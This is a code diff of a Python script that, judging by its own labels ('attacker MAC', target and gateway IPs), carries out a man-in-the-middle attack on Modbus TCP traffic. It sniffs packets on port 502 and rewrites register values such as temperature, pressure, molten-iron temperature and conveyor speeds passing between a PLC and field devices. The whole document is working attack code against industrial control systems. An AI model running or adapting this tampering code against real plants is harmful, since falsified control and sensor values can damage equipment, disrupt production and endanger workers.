@@ -269,17 +269,17 @@ def parse_modbus_data(packet, sport, dport):
                     bb2 = int.from_bytes(register_values[2:4], byteorder='big')  # 压力
                     bb3 = int.from_bytes(register_values[4:6], byteorder='big')  # 空气质量
 
+                    global b1, b2, b3, loag # 声明使用全局变量
 
-                    b1, b2, b3 = bb1, bb2, bb3
                     #b2 = 55
                     # 打印寄存器的值
-                    print(f"wendu（K）: {b1}, yali(MN): {b2}, kongqizhiliang: {b3}")
-                    print_data(b1, b2, b3)  # 保存到数据库
+                    #print(f"wendu（K）: {b1}, yali(MN): {b2}, kongqizhiliang: {b3}")
+                    #print_data(b1, b2, b3)  # 保存到数据库
                     # 从数据库中获取数据温度，
-                    xb1, xb2, xb3, loag = read_data()
+                    #xb1, xb2, xb3, loag = read_data()
                     if loag == 1:
                         # 可以对压力和温度进行修改，这个数据时设备发向plc的状态
-                        b1, b2, b3 = xb1, xb2, xb3
+                        #b1, b2, b3 = xb1, xb2, xb3
                         xmodbus_data = modbus_data[0:2]
                         xmodbus_data += b1.to_bytes(2, byteorder='big')  # 将 b1 转为 2 字节并加入
                         xmodbus_data += b2.to_bytes(2, byteorder='big')  # 将 b2 转为 2 字节并加入
@@ -288,9 +288,9 @@ def parse_modbus_data(packet, sport, dport):
                     else:
                         # 将 modbus_data[0:2], b1, b2, b3 组合到一起
                         xmodbus_data = modbus_data[0:2]  # 保留 modbus_data 的前两字节
-                        xmodbus_data += b1.to_bytes(2, byteorder='big')  # 将 b1 转为 2 字节并加入
-                        xmodbus_data += b2.to_bytes(2, byteorder='big')  # 将 b2 转为 2 字节并加入
-                        xmodbus_data += b3.to_bytes(2, byteorder='big')  # 将 b3 转为 2 字节并加入
+                        xmodbus_data += bb1.to_bytes(2, byteorder='big')  # 将 b1 转为 2 字节并加入
+                        xmodbus_data += bb2.to_bytes(2, byteorder='big')  # 将 b2 转为 2 字节并加入
+                        xmodbus_data += bb3.to_bytes(2, byteorder='big')  # 将 b3 转为 2 字节并加入
 
                     modbus_tdate = mbap_header  # MBAP header 前 7 字节
                     modbus_tdate += xmodbus_data  # 合并 xmodbus_data 到 modbus_tdate
@@ -322,23 +322,24 @@ def parse_modbus_data(packet, sport, dport):
                     a5 = int.from_bytes(register_values[8:10], byteorder='big')  # 传送带1速度单位为cm/s，可能是向下取整
                     a6 = int.from_bytes(register_values[10:12], byteorder='big')  # 传送带2速度单位为cm/s，可能是向下取整
 
-                    print_data_tgzm(a1, a2, a3, a4, a5, a6)
+                    #print_data_tgzm(a1, a2, a3, a4, a5, a6)
                     # 输出结果
                     print(
                         f"写多个保持寄存器: 起始地址: {register_address}, 寄存器数量: {register_count}, 字节数: {byte_count}, 值: {binascii.hexlify(register_values)}")
                     print(
                         f"铁水wendu（K）: {a1}, houdu(m): {a2}, zhiji（mm）: {a3}, mojuwendu（K）: {a4}, 传送带1sudu: {a5}, 传送带2sudu: {a6}")
                     # 这个可以对这6个变量进行修改，是plc控制生产线的初始数据
-                    xa1, xa2, xa3, xa4, xa5, xa6, loag = read_data_tgzm()
+                    #xa1, xa2, xa3, xa4, xa5, xa6, loag = read_data_tgzm()
+                    loag = 0
 
                     if loag == 1:
                         xmodbus_data = modbus_data[0:6]  # 保留 modbus_data 的前两字节
-                        xmodbus_data += xa1.to_bytes(2, byteorder='big')  # 将 a1 转为 2 字节并加入
-                        xmodbus_data += xa2.to_bytes(2, byteorder='big')  # 将 a2 转为 2 字节并加入
-                        xmodbus_data += xa3.to_bytes(2, byteorder='big')  # 将 a3 转为 2 字节并加入
-                        xmodbus_data += xa4.to_bytes(2, byteorder='big')  # 将 a4 转为 2 字节并加入
-                        xmodbus_data += xa5.to_bytes(2, byteorder='big')  # 将 a5 转为 2 字节并加入
-                        xmodbus_data += xa6.to_bytes(2, byteorder='big')  # 将 a6 转为 2 字节并加入
+                        #xmodbus_data += xa1.to_bytes(2, byteorder='big')  # 将 a1 转为 2 字节并加入
+                        #xmodbus_data += xa2.to_bytes(2, byteorder='big')  # 将 a2 转为 2 字节并加入
+                        #xmodbus_data += xa3.to_bytes(2, byteorder='big')  # 将 a3 转为 2 字节并加入
+                        #xmodbus_data += xa4.to_bytes(2, byteorder='big')  # 将 a4 转为 2 字节并加入
+                        #xmodbus_data += xa5.to_bytes(2, byteorder='big')  # 将 a5 转为 2 字节并加入
+                        #xmodbus_data += xa6.to_bytes(2, byteorder='big')  # 将 a6 转为 2 字节并加入
                     else:
                         xmodbus_data = modbus_data[0:6]  # 保留 modbus_data 的前两字节
                         xmodbus_data += a1.to_bytes(2, byteorder='big')  # 将 a1 转为 2 字节并加入
@@ -474,10 +475,15 @@ def packet_callback(packet):
     except Exception as e:
         print(f"[ERROR] 处理包时出错: {e}")
 
-
+# 全局变量
+b1 = 0
+b2 = 0
+b3 = 0
+loag = 0
 def main():
     # 配置相关信息
     global target_ip, gateway_ip
+    global b1, b2, b3, loag  # 声明使用全局变量
     target_ip = "10.0.0.29"  # 替换为目标设备 IP
     gateway_ip = "10.0.0.1"  # 替换为网关 IP
 
@@ -501,12 +507,31 @@ def main():
     print(f"[INFO] 网关 IP: {gateway_ip} ({gateway_mac})")
     print(f"[INFO] 攻击者 MAC: {attacker_mac}")
 
+    try:
+        while True:
+            # 从数据源读取数据
+            xb1, xb2, xb3, xloag = read_data()
+
+            # 更新全局变量
+            b1 = xb1
+            b2 = xb2
+            b3 = xb3
+            loag = xloag
+            # 打印读取的值
+            #print(f"[INFO] 读取到数据: b1={b1}, b2={b2}, b3={b3}, loag={loag}")
+
+            # 等待3秒
+            time.sleep(3)
+
+    except KeyboardInterrupt:
+        print("[INFO] 程序已退出")
     # 启动一个线程捕获目标设备和网关之间的 Modbus TCP 流量
     filter = f"ether dst {attacker_mac} and tcp port 502"
     capture_thread = threading.Thread(
         target=lambda: sniff(iface=iface, filter=filter, prn=packet_callback, store=False))
     capture_thread.daemon = True  # 设置为守护线程，这样主线程退出时它也会自动结束
     capture_thread.start()
+
 
     try:
         disable_ip_forwarding()
